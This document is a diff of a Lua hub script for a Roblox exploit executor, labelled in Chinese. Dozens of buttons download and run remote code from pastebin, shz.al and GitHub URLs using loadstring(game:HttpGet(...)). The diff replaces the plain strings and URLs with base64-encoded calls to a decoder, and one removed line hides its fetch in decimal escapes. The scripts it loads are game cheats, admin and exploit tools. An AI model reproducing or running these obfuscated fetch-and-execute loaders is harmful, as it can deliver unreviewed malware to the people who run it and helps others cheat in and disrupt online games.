+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('YKXynsIOHHTnzewfxFktczdBgFQHjzTnXRIPJMGlHziwGJqJaMuOwiMcxpaBaBWBfmSdti6bKo5pawdWnohJrmnKw='),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('urJBKmnYueAHArirSVMtMflkLoEMabevpMzsNpGrSWbBqaaIXZGldNLapOfFjXTkTqcoTmaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Z2dmhoaC9zdHVyZHktb2N0by1lbmdpbmUvbWFpbi9Qcm90ZWN0ZWRfMTIyMTMzODc0MzcwNjU2MC5sdWEudHh0')))()
 end)
-    credits:Button("雷脚本",function()
-    loadstring(game:HttpGet(('https://pastebin.com/raw/tPB47inG')))()
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('NKpKmBgxoVPqiLjbRthesVSexAXIVRRPEIZYpCQUBgeWZvUSNvwgfmffZnNrXCExKQSwon6Zu36ISa5pys'),function()
+    loadstring(game:HttpGet((tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('HMRvSFGoUXzfsqgEgrJpySqXhGsufADDXIOTklXktPoeEOjtcuZpujxSiycobYyYLnUlwZaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3RQQjQ3aW5H'))))()
 end)
-    credits:Button("秋脚本",function()
-    _G[".秋·自制脚本 遗存抢救"]="2024dncxddtsnchzxtb0112"loadstring(game:HttpGet(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,87,83,98,117,113,47,45,47,109,97,105,110,47,37,69,55,37,65,55,37,56,66,37,67,50,37,66,55,37,69,56,37,56,55,37,65,65,37,69,53,37,56,56,37,66,54,37,69,56,37,56,52,37,57,65,37,69,54,37,57,67,37,65,67})end)())))()
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('iCLfkCEdHlZwlkSrRcspOQtlkyqGKPUZivuBTIFbrqnmHRYsbePCrxrNdewRbhyMXDkqdv56eL6ISa5pys'),function()
+    _G[tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('sdWtDrPRMrxhmZRwrSXyQMJXZazNoCEWUjjTCXkpDqKdUimIYuHoRdLWBnvodFdAsXSSyTLueni8K36Ieq5Yi26ISa5pysIOmBl+WtmOaKouaVkQ==')]=tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('SQPBgtVFfjqmJedMDyAnvehQhYKdzdARzMhydMwZswKiHOQEtqRcKriVWoUBVUNBFlDlaWMjAyNGRuY3hkZHRzbmNoenh0YjAxMTI=')loadstring(game:HttpGet(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,87,83,98,117,113,47,45,47,109,97,105,110,47,37,69,55,37,65,55,37,56,66,37,67,50,37,66,55,37,69,56,37,56,55,37,65,65,37,69,53,37,56,56,37,66,54,37,69,56,37,56,52,37,57,65,37,69,54,37,57,67,37,65,67})end)())))()
 end)
-    credits:Button("鱼脚本",function()
-    getgenv().FISH = "鱼脚本群:851686462"loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\101\108\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\72\119\81\77\82\90\68\69\34\41\41\40\41")("鱼脚本")
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('TpwEyFOMcXKsPQNBCNoEjfiSfnJfXozOMinWMstlyZrfksIbwEoNEvbUyIxrubooehpQXo6bG86ISa5pys'),function()
+    getgenv().FISH = tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('hDwWzzImXTnffbrIBYhEBoaOCDNvXPZThQyjnZkuVnBRPqkkQxsQyTKUbXdZlUnBYPjCWg6bG86ISa5pys576kOjg1MTY4NjQ2Mg==')loadstring(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('PCDqeczJUhNDfGkwINYdkjOURsjjlMglkvGPhxqlosMxphiVWSyuMquOGeonQfSVwcByxrXDEwOFwxMTFcOTdcMTAwXDExNVwxMTZcMTE0XDEwNVwxMTBcMTAzXDQwXDEwM1w5N1wxMDlcMTAxXDU4XDcyXDEwMVwxMDhcMTEyXDcxXDEwMVwxMTZcNDBcMzRcMTA0XDExNlwxMTZcMTEyXDExNVw1OFw0N1w0N1wxMTJcOTdcMTE1XDExNlwxMDFcOThcMTA1XDExMFw0Nlw5OVwxMTFcMTA5XDQ3XDExNFw5N1wxMTlcNDdcNzJcMTE5XDgxXDc3XDgyXDkwXDY4XDY5XDM0XDQxXDQxXDQwXDQx'))(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ROIyonXfkqEYefSlZlQTBSKuGdGZVmHWlEOgqIKZuRigrpytjgaUudemPfUNteVTBpWYHN6bG86ISa5pys'))
 end)
-    credits:Button("火脚本",function()
-    loadstring(game:HttpGet("https://shz.al/~FireCatV2RobloxScript"))()
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('AjzhHULcPzBpcWtqMSQMBexUxSxxhEsArYkFyxWJCyduJlrEJCFdiwZtKIjDHqBqsFzxFJ54Gr6ISa5pys'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('FeCsKSjWnxuTUQOVuzwlMNQFwGVbGBRCUvfVTDgcmCooXExxwzWRgydFBMSddrWEoYBTrOaHR0cHM6Ly9zaHouYWwvfkZpcmVDYXRWMlJvYmxveFNjcmlwdA==')))()
 end)
 
-local creds = window:Tab("HUB",'16060333448')
+local creds = window:Tab(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('eeRqDyimqkZpzvXiGJfqQKsHpqUDyVIqBliGHCwIyDRqEQFYTjFbGFegMADDvRFEZmYxSKSFVC'),tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('dMbKWbHXHqlXUfKbbtemVskZWBAcylkxRHZUpUGntgpzvWuctUSiGRHQdLcERsyAXQoptIMTYwNjAzMzM0NDg='))
 
-local credits = creds:section("HUB脚本",true)
-    credits:Button("EZ-HUB",function()
-    loadstring(game:HttpGet(('https://raw.githubusercontent.com/debug42O/Ez-Industries-Launcher-Data/master/Launcher.lua'),true))()
+local credits = creds:section(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('HoJoCmIttpypVneGIAxLhCcfMagTryGDYfWzwfwRufeTzZXDOArGdVIbfBbraXPSqWMEtOSFVC6ISa5pys'),true)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('IvuCSnBjpSZxttcCjgyvdenxZRfWHzzDzMMEmXhgPpUsDLYNvHDJLlhTmVOmuxGHXzZTMbRVotSFVC'),function()
+    loadstring(game:HttpGet((tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ycYrRGowKmuOUHWvrnjFlddYxjZHnxfdkdxGEkQrglDmjyevDTILbwRffGiLtVvvpwTmwyaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2RlYnVnNDJPL0V6LUluZHVzdHJpZXMtTGF1bmNoZXItRGF0YS9tYXN0ZXIvTGF1bmNoZXIubHVh')),true))()
 end)
-    credits:Button("unfair hub",function()
-    loadstring(game:HttpGet(('https://raw.githubusercontent.com/rblxscriptsnet/unfair/main/rblxhub.lua'),true))()
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('UIydXKqAcVrWcWunCAZwLIlKyzhDyCrdnvLwUShldXvCtacEmdamINFOQGwifDQKuOhwCVdW5mYWlyIGh1Yg=='),function()
+    loadstring(game:HttpGet((tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('XHnLulysQPtvgtlwVAMLVotIafmayKxuEUvRnpjQRzRLcvAYLdlVvoePwTRhSreEyLtSSkaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JibHhzY3JpcHRzbmV0L3VuZmFpci9tYWluL3JibHhodWIubHVh')),true))()
 end)
-local credits = creds:section("脚本密钥链接https://keyrblx.com/getkey/ShifeScripts",true)
-    credits:Button(" Shadow Hub V2",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Alexcirer/Alexcirer/main/V%20d"))()
+local credits = creds:section(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('xYbjtKxGIJNIXuWqBTjupHpxyXVvDhTDZGkcXQvlAEHvypbhJVyKhBrKVBZQPKaIuqoFeW6ISa5pys5a+G6ZKl6ZO+5o6laHR0cHM6Ly9rZXlyYmx4LmNvbS9nZXRrZXkvU2hpZmVTY3JpcHRz'),true)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('UUMXZSHGKpSYtEKtIyiXlmLSIPeHWwqVVfJCYQgAIEuedpbFVTdBmaYQSDJywsYYmJZTEmIFNoYWRvdyBIdWIgVjI='),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('SkgUbiArqgEtcMWWRKAdjTwvQbTweqRkabDdmOdOqmVXKEQAMYoeauuEtwejfBhbkplyqqaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0FsZXhjaXJlci9BbGV4Y2lyZXIvbWFpbi9WJTIwZA==')))()
 end)
-local credits = creds:section("HUB脚本",true)
-    credits:Button("PlaybackX Hub",function()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/NeaPchX2/Playback-X-HUB/main/Protected.lua.txt'))()
+local credits = creds:section(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('FzFtaNRoMTaYMWtYbCHkSSWERtEUGvIUOMIUQIvqGbpdbKIdxQIzpIUFQvZGPAifqHNqhHSFVC6ISa5pys'),true)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('LGILrbzXQCdKXMFyBgrfjuUmRUwaUwtGSdXwdsnXIIoWjMQPJcgAAhmgevTZpIWkbjWwayUGxheWJhY2tYIEh1Yg=='),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('PyUjdAycPMoAUPDGKjVrUueiwZhaBwpUmfuFrmjoWWVMRJAMxHOqwkEvnZgwlkKCNRrheDaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL05lYVBjaFgyL1BsYXliYWNrLVgtSFVCL21haW4vUHJvdGVjdGVkLmx1YS50eHQ=')))()
 end)
-    credits:Button("Tianhe's script hub",function()
-    loadstring(game:HttpGet('https://pastebin.com/raw/xdQVhQdm'))()
-end)
-    credits:Button("Mango hub",function()
-    loadstring(game:HttpGet('https://gitlab.com/L1ZOT/mango-hub/-/raw/main/Mango-Bloxf-Fruits-Beta'))()
-end)
-    credits:Button("SOG hub",function()
-    loadstring(game:HttpGet("https://shz.al/~JAJSNN233"))()
-end)
-    credits:Button("VG hub",function()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/1201for/V.G-Hub/main/V.Ghub'))()
-end)
-    credits:Button("Owl-Hub『嘿嘿』",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))()
-end)
-    credits:Button("HOHO_hub",function()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI'))()
-end)
-
-local creds = window:Tab("FE脚本『这几天将全部添加』",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("C00lgui",function()
-    loadstring(game:GetObjects("rbxassetid://8127297852")[1].Source)()
-end)
-    credits:Button("1x1x1x1",function()
-    loadstring(game:HttpGet(('https://pastebin.com/raw/JipYNCht'),true))()
-end)
-    credits:Button("Abyssal sword",function()
-    loadstring(game:HttpGet("https://shz.al/~KHHG"))()
-end)
-    credits:Button("FE传送",function()
-    mouse = game.Players.LocalPlayer:GetMouse() tool = Instance.new("Tool") tool.RequiresHandle = false tool.Name = "[FE] TELEPORT TOOL" tool.Activated:connect(function() local pos = mouse.Hit+Vector3.new(0,2.5,0) pos = CFrame.new(pos.X,pos.Y,pos.Z) game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos end) tool.Parent = game.Players.LocalPlayer.Backpack
-end)
-    credits:Button("AKV",function()
-    loadstring(game:HttpGet("https://shz.al/~KHHGK"))()
-end)
-    credits:Button("AK47",function()
-    loadstring(game:HttpGet("https://shz.al/~KHHGKK"))()
-end)
-    credits:Button("AbyssEye",function()
-    loadstring(game:HttpGet("https://shz.al/~KHJJ"))()
-end)
-    credits:Button("Animation ID Player",function()
-    loadstring(game:HttpGet("https://shz.al/~KHJJK"))()
-end)
-    credits:Button("Angel wing master",function()
-    loadstring(game:HttpGet("https://shz.al/~HHA"))()
-end)
-    credits:Button("Amythest Sword",function()
-    loadstring(game:HttpGet("https://shz.al/~HHAJ"))()
-end)
-    credits:Button("Amythest Ninja",function()
-    loadstring(game:HttpGet("https://shz.al/~HHAJK"))()
-end)
-    credits:Button("Baldi FE",function()
-    loadstring(game:HttpGet("https://shz.al/~KKHHAJK"))()
-end)
-    credits:Button("Backup",function()
-    loadstring(game:HttpGet("https://shz.al/~KKHHAJKKK"))()
-end)
-    credits:Button("Aureate",function()
-    loadstring(game:HttpGet("https://shz.al/~KKHHAJKK"))()
-end)
-    credits:Button("Anti Furry lol",function()
-    loadstring(game:HttpGet("https://shz.al/~KMH"))()
-end)
-    credits:Button("Bumper Car",function()
-    loadstring(game:HttpGet("https://shz.al/~KMHK"))()
-end)
-    credits:Button("Bizzaro",function()
-    loadstring(game:HttpGet("https://shz.al/~KMHKM"))()
-end)
-    credits:Button("Billie",function()
-    loadstring(game:HttpGet("https://shz.al/~KMHKMM"))()
-end)
-    credits:Button("Big Daddy",function()
-    loadstring(game:HttpGet("https://shz.al/~LBN"))()
-end)
-    credits:Button("Ban Sword",function()
-    loadstring(game:HttpGet("https://shz.al/~LBNK"))()
-end)
-    credits:Button("cadacus",function()
-    loadstring(game:HttpGet("https://shz.al/~LBNKj"))()
-end)
-    credits:Button("Cop",function()
-    loadstring(game:HttpGet("https://shz.al/~LBNKjk"))()
-end)
-    credits:Button("CLOVR",function()
-    loadstring(game:HttpGet("https://shz.al/~kansjs"))()
-end)
-    credits:Button("Chips",function()
-    loadstring(game:HttpGet("https://shz.al/~kkkansjs"))()
-end)
-    credits:Button("Chara",function()
-    loadstring(game:HttpGet("https://shz.al/~97373"))()
-end)
-    credits:Button("Carnage",function()
-    loadstring(game:HttpGet("https://shz.al/~k97373"))()
-end)
-    credits:Button("Pendulum Hub V5",function()
-    loadstring(game:HttpGet("https://shz.al/~k97373k"))()
-end)
-    credits:Button("PUBG Pan",function()
-    loadstring(game:HttpGet("https://shz.al/~k97373kK"))()
-end)
-    credits:Button("SCP-106",function()
-    loadstring(game:HttpGet("https://shz.al/~LDS"))()
-end)
-    credits:Button("KillbotV2",function()
-    loadstring(game:HttpGet("https://shz.al/~LDSLS"))()
-end)
-
-local creds = window:Tab("Vehicle Legends CARS!脚本",'16060333448')
-
-local credits = creds:section("『卡密模式』",true)
-    credits:Button("Vehicle Legends CARS!",function()
-    loadstring(game:HttpGet('https://scripts.luawl.com/hosted/2399/18728/FiberHubFree.lua'))()
-end)
-    credits:Button("点击我复制dc链接自己弄",function()
-    setclipboard("https://discord.gg/NZYMVZvT2H")
-end)
-local credits = creds:section("『不需要卡密模式』",true)
-    credits:Button("Vehicle Legends CARS!",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/houjk2/Boosthub/main/main.lua"))()
-end)
-    credits:Button("Vehicle Legends CARS!",function()
-    loadstring(game:HttpGet("https://shz.al/~CNCJJFD882"))()
-end)
-
-local creds = window:Tab("Sol's RNG脚本",'16060333448')
-
-local credits = creds:section("『卡密模式』",true)
-    credits:Button("Sol's RNG",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Alan0947383/Demonic-HUB-V2/main/S-C-R-I-P-T.lua",true))()
-end)
-    credits:Button("点击我复制密钥链接",function()
-    setclipboard("https://pandadevelopment.net/startkey.html?service=demonichubv2")
-end)
-    credits:Button("热乎呢刚找的Sol's RNG",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Rah-Md/Sol-Rgn-Scripts/main/Upd.lua"))()
-end)
-    credits:Button("点击我复制链接",function()
-    setclipboard("https://linkvertise.com/1045829/sol-rgn-script-upd?o=sharing")
-end)
-
-local credits = creds:section("『免费模式』",true)
-    credits:Button("Sol's RNG",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Looser3itx/Hmmmmmmmmmmmmmmmmmmmmmmmmmmmm/main/loader.lua"))()
-end)
-    credits:Button("hub",function()
-    loadstring(game:HttpGet("https://shz.al/~JAJSNN233"))()
-end)
-
-local creds = window:Tab("力量传奇",'16060333448')
-
-local credits = creds:section("自制为云脚本ui",true)
-    credits:Button("新力量传奇修复版",function()
-    loadstring(game:HttpGet("https://shz.al/~ANJSJS"))()
-end)
-    credits:Button("霖溺力量传奇（来源白貓）",function()
-    loadstring(game:HttpGet("https://shz.al/~baimaomeili"))()
-end)
-    credits:Button("剑客脚本",function()
-    jianke_V4 = "作者_初夏"jianke__V4 = "作者QQ1412152634"jianke___V4 = "剑客QQ群347724155"loadstring(game:HttpGet(('https://shz.al/~JianKeV4')))()
-end)
-
-local creds = window:Tab("极速传奇",'16060333448')
-
-local credits = creds:section("自制为云ui",true)
-    credits:Button("霖溺自制极速传奇",function()
-    loadstring(game:HttpGet("https://shz.al/~lninjj"))()
-end)
-    credits:Button("剑客脚本",function()
-    jianke_V4 = "作者_初夏"jianke__V4 = "作者QQ1412152634"jianke___V4 = "剑客QQ群347724155"loadstring(game:HttpGet(('https://shz.al/~JianKeV4')))()
-end)
-
-local creds = window:Tab("忍者传奇",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("霖溺忍者传奇（来源白貓）",function()
-    loadstring(game:HttpGet("https://shz.al/~baimaomeilihh"))()
-end)
-    credits:Button("忍者传奇",function()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/Zyb150933/zyb/main/123'))()
-end)
-    credits:Button("剑客脚本",function()
-    jianke_V4 = "作者_初夏"jianke__V4 = "作者QQ1412152634"jianke___V4 = "剑客QQ群347724155"loadstring(game:HttpGet(('https://shz.al/~JianKeV4')))()
-end)
-    credits:Button("忍者（老外1）",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/zerpqe/script/main/NinjaLegends.lua"))()
-end)
-    credits:Button("忍者（老外2）",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatBlueDevil/Bleus/main/Ninja%20Legends/Source.lua"))()
-end)
-
-local creds = window:Tab("监狱人生",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("油管找的管理员脚本",function()
-    loadstring(game:HttpGet("https://shz.al/~ggghhhh"))()
-end)
-    credits:Button("汉化后的moonhub",function()
-    loadstring(game:HttpGet("https://shz.al/~MoonHub"))()
-end)
-local credits = creds:section("Tiger无敌了",true)
-    credits:Button("tiger",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/dalloc2/Roblox/main/TigerAdmin.lua"))()
-end)
-local credits = creds:section("霖溺嘿",true)
-    credits:Button("听说吊打一切",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Denverrz/scripts/master/PRISONWARE_v1.3.txt"))()
-end)
-    credits:Button("请使用青脚本里的管理员脚本（推荐）",function()
-    loadstring(game:HttpGet('https://rentry.co/ct293/raw'))()
-end)
-    credits:Button("剑客脚本（通用）",function()
-    jianke_V4 = "作者_初夏"jianke__V4 = "作者QQ1412152634"jianke___V4 = "剑客QQ群347724155"loadstring(game:HttpGet(('https://shz.al/~JianKeV4')))()
-end)
-
-local creds = window:Tab("死亡球",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("死亡球（1）",function()
-    loadstring(game:HttpGet("https://github.com/Hosvile/InfiniX/releases/latest/download/main.lua",true))()
-end)
-    credits:Button("死亡球（2）",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/Ball1/main/Death"))()
-end)
-
-local creds = window:Tab("自然灾害",'16060333448')
-
-local credits = creds:section("自制为云ui",true)
-    credits:Button("霖溺自制自然灾害",function()
-    loadstring(game:HttpGet("https://shz.al/D8Kn"))()
-end)
-    credits:Button("自然灾害lua",function()
-    loadstring(game:HttpGet("https://pastebin.com/raw/5fKvum70"))()
-end)
-    credits:Button("自然灾害1",function()
-    loadstring(game:HttpGet("https://gist.githubusercontent.com/TurkOyuncu99/7c75386107937fa006304efd24543ad4/raw/8d759dfcd95d39949c692735cfdf62baec0bf835/cafwetweg", true))()
-end)
-    credits:Button("自然灾害2",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/scripts/LoadstringUjHI6RQpz2o8", true))()
-end)
-    credits:Button("自然灾害3",function()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/9NLK7/93qjoadnlaknwldk/main/main'))()
-end)
-    credits:Button("剑客脚本",function()
-    jianke_V4 = "作者_初夏"jianke__V4 = "作者QQ1412152634"jianke___V4 = "剑客QQ群347724155"loadstring(game:HttpGet(('https://shz.al/~JianKeV4')))()
-end)
-
-local creds = window:Tab("杀手于警长",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("杀手于警长（找的）",function()
-    loadstring(game:HttpGet("https://pastebin.com/raw/yadbPQUm",true))()
-end)
-    credits:Button("剑客脚本（通用）",function()
-    jianke_V4 = "作者_初夏"jianke__V4 = "作者QQ1412152634"jianke___V4 = "剑客QQ群347724155"loadstring(game:HttpGet(('https://shz.al/~JianKeV4')))()
-end)
-
-local creds = window:Tab("巴掌模拟器",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("自动刷巴掌",function()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/ionlyusegithubformcmods/1-Line-Scripts/main/Slap%20Farm'))()
-end)
-    credits:Button("巴掌模拟器yyds",function()
-    loadstring(game:HttpGet("https://shz.al/~HHAKKSSKSOOS"))()
-end)
-    credits:Button("巴掌模拟器",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/dizyhvh/slap_battles_gui/main/0.lua"))()
-end)
-    credits:Button("常用功能",function()
-    loadstring(game:HttpGet("https://lkhub.net/s/loader.lua"))()
-end)
-    credits:Button("多功能（老外）",function()
-    loadstring(game:HttpGet(("https://raw.githubusercontent.com/ionlyusegithubformcmods/1-Line-Scripts/main/Slap%20Battles")))()
-end)
-
-local creds = window:Tab("内脏与黑火药脚本",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("加入https://discord.gg/RjqwhMY7DU获取密钥",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/FnfCheatbotsonroblox/kitten.cc-lua/main/kitten-obfuscated%20(1).lua"))()
-end)
-    credits:Button("点击我复制dc",function()
-    setclipboard("https://discord.gg/RjqwhMY7DU")
-end)
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("内脏与黑火药",function()
-    loadstring(game:HttpGet("https://shz.al/~KSKKS"))()
-end)
-
-local creds = window:Tab("51区脚本",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("51区",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Saktk-In-Area51/main/Area51", true))()
-end)
-
-local creds = window:Tab("短信模拟器脚本",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("短信模拟器",function()
-    loadstring(game:HttpGet(('https://pastebin.com/raw/9hxkxUZ5'),true))()
-end)
-
-local creds = window:Tab("克隆大亨脚本",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("克隆大亨",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/HELLLO1073/RobloxStuff/main/CT-Destroyer"))()
-end)
-
-local creds = window:Tab("刀刃球",'16060333448')
-
-local credits = creds:section("『LINNI Script』（听说的战场）",true)
-    credits:Button("霖溺汉化刀刃球",function()
-    loadstring(game:HttpGet("https://shz.al/75G8"))()
-end)
-    credits:Button("Seeds-Next刀刃球不会的自己研究『强，作者推荐』",function()
-    loadstring(game:HttpGet(('https://shz.al/~Seeds-Next/Ditto-so-tried/HAGOU-and-Qumuuuuu')))()
-end)
-    credits:Button("刀刃球（强1）",function()
-    loadstring(game:HttpGet(('https://raw.githubusercontent.com/Unknownkellymc1/Unknownscripts/main/slap-battles')))()
-end)
-    credits:Button("刀刃球（强2）",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/HKLua/Balls/main/DawnLoader.lua"))()
-end)
-    credits:Button("刀刃球（强3）",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/BladeBall/main/redz9999"))()
-end)
-    credits:Button("刀刃球（强4）",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Neoncat765/Neon.C-Hub-X/main/UnknownVersion"))()
-end)
-    credits:Button("刀刃球（强5）",function()
-    local a,b,c,d=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,"https://shz.al/~NeoV4"c(a and b, "Your Executor does not support.")a(b({Url=d,Method="GET"}).Body)()
-end)
-    credits:Button("刀刃球（强6）",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/HKLua/Balls/main/DawnLoader.lua"))()
-end)
-    credits:Button("剑客脚本",function()
-    jianke_V4 = "作者_初夏"jianke__V4 = "作者QQ1412152634"jianke___V4 = "剑客QQ群347724155"loadstring(game:HttpGet(('https://shz.al/~JianKeV4')))()
-end)
-
-local creds = window:Tab("模仿者",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("模仿者（1有自动赢）",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/ttjy9808/obfloadstringmainmimic/main/README.md", true))()
-end)
-    credits:Button("模仿者（名字相同脚本不同）",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/ttjy9808/obfloadstringmainmimic/main/README.md", true))()
-end)
-    credits:Button("剑客脚本",function()
-    jianke_V4 = "作者_初夏"jianke__V4 = "作者QQ1412152634"jianke___V4 = "剑客QQ群347724155"loadstring(game:HttpGet(('https://shz.al/~JianKeV4')))()
-end)
-
-local creds = window:Tab("出租车司机脚本",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("自动抽蛋开启",function()
-    loadstring(game:HttpGet("https://shz.al/~KAKSKSK"))()
-end)
-    credits:Button("自动抽蛋关闭",function()
-    loadstring(game:HttpGet("https://shz.al/~KA28272"))()
-end)
-
-local creds = window:Tab("战斗勇士",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("战斗勇士（英文电脑端，直接畅玩）",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/frkfx/Combat-Warriors/main/Script"))()
-end)
-    credits:Button("战斗勇士老外英文",function()
